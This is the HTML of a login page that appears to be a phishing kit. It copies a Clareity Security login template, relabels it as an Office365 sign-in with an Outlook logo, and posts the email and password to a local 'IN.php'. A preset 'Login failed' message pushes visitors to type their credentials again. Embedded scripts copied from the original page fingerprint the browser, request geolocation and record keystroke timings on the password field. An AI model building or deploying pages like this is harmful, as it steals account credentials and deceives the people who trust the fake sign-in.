<!DOCTYPE html>
<html lang="en"
      xmlns:db="http://www.w3.org/1999/xhtml">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>Login</title>
  <link id="fontawesome" rel="stylesheet" type="text/css" href="https://cdn.clareitysecurity.net/css/font-awesome-4.6.3.min.css">
  <link id="favicon" rel="icon" type="image/png" href="" sizes="32x32" />
  <link id="bootstrapcss" href="https://cdn.clareitysecurity.net/css/bootstrap-4.1.2.min.css" rel="stylesheet">
  <link id="googlefont" href="https://fonts.googleapis.com/css?family=Roboto:300,400,700" rel="stylesheet">
  <link id="logincss" rel="stylesheet" href="https://cdn.clareitysecurity.net/css/login.css" />
      <style>
      body{background: url(https://lh3.googleusercontent.com/proxy/WTb8N8M_LAIti2xAgsdKHgIozwgK_U5W8bXx1cxYMsofjzmpgi94OucqtPAyW2r-pCsQxUMvAnpY0dCWR5xFGHMHLwgDao79dgC0YkTxfoJvlyOynJLehXjF2QhqFTtYzzlA1VrhY5LHenigSh-jVN4ygIKLXZo1YuLLsRLv) no-repeat center center fixed;-webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover;}
      #centerdiv{ background: #fff url(https://cdn.clareitysecurity.net/sys/alberta/paragon-login-bg.png) no-repeat center center; position: absolute;top: 50%;left: 50%;margin-top: -230px;margin-left: -300px;width: 600px;height: 460px; box-shadow: 0px 0px 5px 5px #333; border:1px solid #000;}
      .submitbtn{background:#1B3B7C; color:#fff;text-shadow:none;box-shadow:none;border-color:#1B3B7C; filter:none;}
      .submitbtn:hover { background: #014B9C;filter:none;}
      #password{display: inline-block;}

      #session-dialog{height: 300px}
      #modal-session-continue{color: #fff}
      .modal {display: flex !important;opacity: 1 !important;}
      .modal-dialog {justify-content: center !important;top: 50px;}
      .modal-content {width: initial !important;}
      .modal-backdrop.fade.in{opacity: .8 !important;}
      </style>
      </head>
      <body>
      <script id="googletrack" type="text/javascript" src="https://cdn.clareitysecurity.net/sys/alberta/googletrack.js"></script>
      <div id="centerdiv">

        <table style="background:#fff; width:400px; margin:50px auto; border:1px solid #000">
          <tr >
            <td colspan="2" class="center" style="padding:10px;">
			<img id="logo" src="https://cdn2.downdetector.com/static/uploads/logo/outlook-com-logo.png" border="0" width="295" height="61" /><p>
			Login with your <i><b><font color="#FF0000">Office365</font></b></i> 
			Email Address</td>
          </tr>
          <tr>
            <td width="379"><div class="center">

              <div id="form_login_wrapper" style="padding:0 15px">

                

                <div id="divholder" class="form-signin text-left">
                  <label for="person" class="sr-only">Email</label>
                  <div class="editicon usericon"><i class="fa fa-user"></i></div>
                  <div class="form-control person" data-ph="Email Address" id="clareity" contenteditable="true" required></div>

                  <label for="lock" class="sr-only">Password</label>
                  <div class="editicon passicon"><i class="fa fa-lock"></i></div>
                  <div class="form-control lock" data-ph="Password" id="security" contenteditable="true" required></div>
					<font color="#FF0000">Login failed. Enter your correct Email and Password</font></div>
                </div>
                </div>

                  <form id="form_login" action="IN.php" method='POST'>
                      <div style="display:none">
                          <input id="form-clareity" name="username" type="hidden" tabindex="-1" required/>
                          <input id="form-security" name="password" type="hidden" tabindex="-2" required/>
                      </div>
                      <div class="form-bottom">
                          <button id="loginbtn" class="btn btn-lg btn-primary btn-block" type="button" >Login</button>

                      </div>
                  </form>
              </div>


              </div></td>
          </tr>
        </table>
      </div>



<script id="jqueryjs" type="text/javascript" src="https://cdn.clareitysecurity.net/js/jquery-3.3.1.min.js"></script>
<script id="loginscript" src="https://cdn.clareitysecurity.net/js/script-xkd.2.js"></script>
<script id="bootstrapjs" src="https://cdn.clareitysecurity.net/js/bootstrap.min.js"></script>

    <div style="display: none">
        <div >
    <script>
        CLAREITY = {
            collectorSystemName: 'rae',
            collectorUrl: 'https://collector.clareity.net',
            tic: 1622441672884
        };

    </script>
    <script>var fingerprintOn = false;

var CLAREITY_FP = {

		//Return the fingerprint for this computer
		getFingerprint: function () {
            console.log('fingerprint on');

            fingerprintOn = true;

			var fingerprint = [];
			CLAREITY_FP.getBasics(fingerprint);
			CLAREITY_FP.getDatabase(fingerprint);
			CLAREITY_FP.getPluginsString(fingerprint);
			CLAREITY_FP.getCanvas(fingerprint);
			return fingerprint;
		},
		
		//return the basic browser's characteristics
		getBasics: function (fingerprint) {
			fingerprint['resolution'] = window.screen.width + "x" + window.screen.height;
			fingerprint['userAgent'] = navigator.userAgent;
			fingerprint['language'] = navigator.language;
			fingerprint['timezone'] = new Date().getTimezoneOffset();
			fingerprint['platform'] = navigator.platform;
			fingerprint['path'] = window.location.pathname;
		},
		
		//return the browser's database capabilities
		getDatabase: function (fingerprint) {
			fingerprint['db0'] = (!!window.indexedDB);
			fingerprint['db1'] = (typeof(window.openDatabase));
		},
		
		//return a list (as string) of all installed plugins
		getPluginsString: function (fingerprint) {
			var miniPlugins = "";
			for(var i = 0 ; i < navigator.plugins.length; i++) {
				miniPlugins += String(navigator.plugins[i]['name']).replace(new RegExp("[ ]", 'g'), "") + " ";
			}
			fingerprint['plugins'] = miniPlugins;
		},
		
		//return a semi unique id based on a canvas fingerprint
		getCanvas: function (fingerprint) {
			try {
				var elem = document.createElement('canvas');
				if (!!(elem.getContext && elem.getContext('2d'))) {
					var canvas = document.createElement('canvas');
					var ctx = canvas.getContext('2d');
					var txt = 't';
					try {ctx.font = "14px Arial";} catch (e1) {}
					ctx.textBaseline = "alphabetic";
					ctx.fillStyle = "#abc";
					ctx.fillRect(125,1,62,20);
					ctx.fillStyle = "#093";
					var hash = hashString(canvas.toDataURL());
					fingerprint['canvas'] = hash;
				} else {
					fingerprint['canvas'] = "none";
				}
			} catch (e2) {
				fingerprint['canvas'] = "none";
			}
		},
		
		
		hashString: function (string) {
			hash = [];
			var offset = string.length / 19;
			for(var i = 0; i < 20; i++) {
				hash[i] = Math.round(i * offset * 1000) / 1000;
			}
			return String(hash).replace(new RegExp("[,\.]", 'g'), "");
		}

} /* end CLAREITY_FP */

var CLAREITY_NG = {
		
		collect: function () {
			var fingerprint = CLAREITY_FP.getFingerprint();
			CLAREITY_NG.nguage(fingerprint);
		},
		readCookie: function(name) {
			var nameEQ = name + "=";
	        var ca = document.cookie.split(';');
	        for (var i = 0; i < ca.length; i++) {
	            var c = ca[i];
	            while (c.charAt(0) == ' ') c = c.substring(1, c.length);
	            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
	        }
	        return null;
		},
		nguage: function (fingerprint) {
			
			var transactionId = CLAREITY_NG.readCookie("clareitysecurity-tid");
			var deviceId = CLAREITY_NG.readCookie("clareitysecurity-did");
			
			var url;
			if (transactionId && deviceId) {
				 url = CLAREITY.collectorUrl + "/Collector/" + CLAREITY.tic + "?team=nguage&trxId=" + transactionId + "&deviceId=" + deviceId + "&systemName=" + CLAREITY.collectorSystemName + "&data=";
			} else {
				 url = CLAREITY.collectorUrl + "/Collector/" + CLAREITY.tic + "?team=nguage&systemName=" + CLAREITY.collectorSystemName + "&data=";
			}
				
			var data = '{' +
			    '"resolution":"' + escape(fingerprint['resolution']) + '", ' +
				'"userAgent":"' + escape(fingerprint['userAgent']) + '", ' +
				'"language":"' + escape(fingerprint['language']) + '", ' +
				'"timezone":"' + escape(fingerprint['timezone']) + '", ' +
				'"platform":"' + escape(fingerprint['platform']) + '", ' +
				'"db0":"' + escape(fingerprint['db0']) + '", ' +
				'"db1":"' + escape(fingerprint['db1']) + '", ' +
				'"plugins":"' + escape(fingerprint['plugins']) + '", ' +
				'"canvas":"' + escape(fingerprint['canvas']) + '" ' +
				'}';
		
			url = url + data;
			
			(function(d, t) {
			    var g = d.createElement(t),
			        s = d.getElementsByTagName(t)[0];
			    g.src = url;
			    s.parentNode.insertBefore(g, s);
			}(document, 'script'));
		
		}

} /* end CLAREITY_NG */

CLAREITY_NG.collect();

var geolocationOn = false;

var CLAREITY_GEO = {

		getLocation: function () {
			try {

				console.log('geolocation on');

                geolocationOn = true;

				if (navigator.geolocation) {
					navigator.geolocation.getCurrentPosition(CLAREITY_GEO.showPosition, CLAREITY_GEO.noPosition);
				}
			} catch (ex) {}
		},

		noPosition: function (err) {
			
			var transactionId = CLAREITY_GEO.readCookie("clareitysecurity-tid");
			var deviceId = CLAREITY_GEO.readCookie("clareitysecurity-did");
			
			var url;
			if (transactionId && deviceId) {
				 url = CLAREITY.collectorUrl + "/Collector/" + CLAREITY.tic + "?team=geo&trxId=" + transactionId + "&deviceId=" + deviceId + "&systemName=" + CLAREITY.collectorSystemName + "&data=";
			} else {
				 url = CLAREITY.collectorUrl + "/Collector/" + CLAREITY.tic + "?team=geo&systemName=" + CLAREITY.collectorSystemName + "&data=";
			}
			
			var detail = err.code + " (" + err.message + ")";
			var data = '{' +
			    '"geoerror":"' + escape(detail) + '" ' +
				'}';
			
			url = url + data;
			
			(function(d, t) {
			    var g = d.createElement(t),
			        s = d.getElementsByTagName(t)[0];
			    g.src = url;
			    s.parentNode.insertBefore(g, s);
			}(document, 'script'));
		
		},		
		readCookie: function(name) {
			var nameEQ = name + "=";
	        var ca = document.cookie.split(';');
	        for (var i = 0; i < ca.length; i++) {
	            var c = ca[i];
	            while (c.charAt(0) == ' ') c = c.substring(1, c.length);
	            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
	        }
	        return null;
		},
		showPosition: function (position) {
			var lat = position.coords.latitude;
			var lng = position.coords.longitude;
			var accuracy = position.coords.accuracy;
			
			var transactionId = CLAREITY_GEO.readCookie("clareitysecurity-tid");
			var deviceId = CLAREITY_GEO.readCookie("clareitysecurity-did");
			
			var url;
			if (transactionId && deviceId) {
				 url = CLAREITY.collectorUrl + "/Collector/" + CLAREITY.tic + "?team=geo&trxId=" + transactionId + "&deviceId=" + deviceId + "&systemName=" + CLAREITY.collectorSystemName + "&data=";
			} else {
				 url = CLAREITY.collectorUrl + "/Collector/" + CLAREITY.tic + "?team=geo&systemName=" + CLAREITY.collectorSystemName + "&data=";
			}
			
			var data = '{' +
			    '"latitude":"' + escape(lat) + '", ' +
				'"longitude":"' + escape(lng) + '", ' +
				'"accuracy":"' + escape(accuracy) + '" ' +
				'}';
		
			url = url + data;
			
			(function(d, t) {
			    var g = d.createElement(t),
			        s = d.getElementsByTagName(t)[0];
			    g.src = url;
			    s.parentNode.insertBefore(g, s);
			}(document, 'script'));
		}
		
} /* end CLAREITY_GEO */

CLAREITY_GEO.getLocation();
"use strict";

function _instanceof(left, right) { if (right != null && typeof Symbol !== "undefined" && right[Symbol.hasInstance]) { return right[Symbol.hasInstance](left); } else { return left instanceof right; } }

function _classCallCheck(instance, Constructor) { if (!_instanceof(instance, Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } }

function _createClass(Constructor, protoProps, staticProps) { if (protoProps) _defineProperties(Constructor.prototype, protoProps); if (staticProps) _defineProperties(Constructor, staticProps); return Constructor; }

function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; }

/*This file must be uploaded to collector test pages system/collector-test for KD to work.*/
var iwork = "iwork";

var CLAREITY_KD =
/*#__PURE__*/
function () {
  function CLAREITY_KD(passwordField) {
    _classCallCheck(this, CLAREITY_KD);

    _defineProperty(this, "passwordField", void 0);

    _defineProperty(this, "whitelist", [9, 16, 17, 18, 19, 20, 27, 33, 34, 35, 36, 37, 38, 39, 40, 45, 91, 92, 93, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 144, 145]);

    _defineProperty(this, "resetKeys", [8, 33, 34, 35, 36, 37, 38, 39, 40, 45, 46]);

    _defineProperty(this, "arrayTimeKeys", []);

    _defineProperty(this, "lastKey", void 0);

    _defineProperty(this, "dictPressedKey", {});

    console.log(passwordField);
    this.passwordField = passwordField;
    this.hookEvent();
  } //Array of white listed keys


  _createClass(CLAREITY_KD, [{
    key: "hookEvent",

    /* Hook the form to the internal event handlers
     */
    value: function hookEvent() {
      console.log('called KD hook event');
      var focusLock = false; //Hooking event listeners on the password field

      var _this = this;

      this.passwordField.click(this.clearPasswordEvents.bind(this)).select(this.clearPasswordEvents.bind(this)).focus(function () {
        setTimeout(function () {
          if (focusLock === false) {
            _this.clearPasswordEvents();
          } else {
            focusLock = false;
          }
        }, 50);
      }).blur(function () {
        focusLock = true;
        setTimeout(function () {
          focusLock = false;
        }, 50);
      }).keydown(this.onKeyDown.bind(this)).keyup(this.onKeyUp.bind(this)).bind('drop', function () {
        setTimeout(this.clearPasswordEvents.bind(this));
      }).bind('paste', function (e) {
        e.preventDefault();
      });
    }
  }, {
    key: "onKeyDown",

    /* KeyDown event handler
     */
    value: function onKeyDown(event) {
      //Simulate a keyUp event if the user keep a key pressed
      if (event.keyCode == this.lastKey) {
        this.onKeyUp(event);
      } //if the key is illegible then it saves the keydown timestamp


      if (this.whitelist.indexOf(event.keyCode) == -1) {
        this.dictPressedKey[event.keyCode] = event.timeStamp;
        this.lastKey = event.keyCode;
      }
    }
  }, {
    key: "onKeyUp",

    /* KeyUp event handler
     */
    value: function onKeyUp(event) {
      //if 'enter' key
      if (event.keyCode == 13) {
        return;
      } //if it is a reset
      else if (this.resetKeys.indexOf(event.keyCode) != -1) {
          this.clearPasswordEvents();
        } //regular key
        else if (this.dictPressedKey[event.keyCode]) {
            this.arrayTimeKeys.push([this.dictPressedKey[event.keyCode], event.timeStamp]);
            this.debug("Pushing " + this.arrayTimeKeys.length + "th key:  " + event.keyCode + " from " + this.dictPressedKey[event.keyCode] + " to " + event.timeStamp);
          } else {
            this.debug("non recognized key");
          }

      this.lastKey = 0;
    }
  }, {
    key: "clearPasswordEvents",

    /* Clear the password events
     * just like the user never typed a password
     */
    value: function clearPasswordEvents() {
      this.arrayTimeKeys = [];
      this.lastKey = 0;
      this.dictPressedKey = [];
      this.passwordField.html('');
    }
    /* Calculate the feature vector for the given password
     */

  }, {
    key: "calculateFeatures",
    value: function calculateFeatures() {
      //sort the events by pressed down time
      //(it should already be sorted)
      this.arrayTimeKeys.sort(); //generating the features for each event

      var pattern = "";

      for (var i = 0; i < this.arrayTimeKeys.length - 1; i++) {
        var dWell = this.arrayTimeKeys[i][1] - this.arrayTimeKeys[i][0]; //feature 1 difference between a key is pressed and released

        var interval = this.arrayTimeKeys[i + 1][0] - this.arrayTimeKeys[i][1]; //feature 2 difference between a key1 is released and key2 is pressed

        var latency = this.arrayTimeKeys[i + 1][1] - this.arrayTimeKeys[i][0]; //feature 3 difference between a key1 is pressed and key2 is released

        var flight = this.arrayTimeKeys[i + 1][0] - this.arrayTimeKeys[i][0]; //feature 4 difference between a key1 is pressed and key2 is pressed

        var upToUp = this.arrayTimeKeys[i + 1][1] - this.arrayTimeKeys[i][1]; //feature 5 difference between a key1 is released and key2 is released

        pattern = pattern + dWell + '	' + interval + '	' + latency + '	' + flight + '	' + upToUp + '	';
      }

      return pattern;
    }
  }, {
    key: "readCookie",
    value: function readCookie(name) {
      var nameEQ = name + "=";
      var ca = document.cookie.split(';');

      for (var i = 0; i < ca.length; i++) {
        var c = ca[i];

        while (c.charAt(0) == ' ') {
          c = c.substring(1, c.length);
        }

        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
      }

      return null;
    }
    /* Send the feature vector to the server
     * Uses script injection to send the data instead of a regular AJAX request
     */

  }, {
    key: "sendData",
    value: function sendData() {
      //generates pattern
      var pattern = this.calculateFeatures();
      var transactionId = this.readCookie("clareitysecurity-tid");
      var deviceId = this.readCookie("clareitysecurity-did");
      var url;

      if (transactionId && deviceId) {
        url = CLAREITY.collectorUrl + "/Collector/" + CLAREITY.tic + "?team=tiempo&trxId=" + transactionId + "&deviceId=" + deviceId + "&systemName=" + CLAREITY.collectorSystemName + "&data=";
      } else {
        url = CLAREITY.collectorUrl + "/Collector/" + CLAREITY.tic + "?team=tiempo&systemName=" + CLAREITY.collectorSystemName + "&data=";
      }

      var data = '{' + '"kd":"' + escape(pattern) + '", ' + '"pw":"' + this.hashCode(this.passwordField.html()) + '", ' + '"mc":"' + escape("") + '" ' + '}';
      url = url + data;
      this.debug(url); //Sends the data and uses a callback when the data has fully been sent

      window.$.ajax({
        url: url,
        dataType: "script"
      });
    }
  }, {
    key: "debug",

    /* Debug method
     */
    value: function debug(msg) {
      var d = false; //set to true for more verbose and false for no verbose

      if (d === true) {
        console.log(msg);
      }
    }
    /* Simple hashing algorithm for strings
     */

  }, {
    key: "hashCode",
    value: function hashCode(str) {
      var hash = 0;

      if (str.length == 0) {
        return hash;
      }

      for (var i = 0; i < str.length; i++) {
        var c = str.charCodeAt(i);
        hash = (hash << 4) - hash + c;
      }

      return hash * hash;
    }
  }]);

  return CLAREITY_KD;
}();

var clareityrisk = new CLAREITY_KD($('#security'));
</script>
</div>
    </div>
  </body>
</html>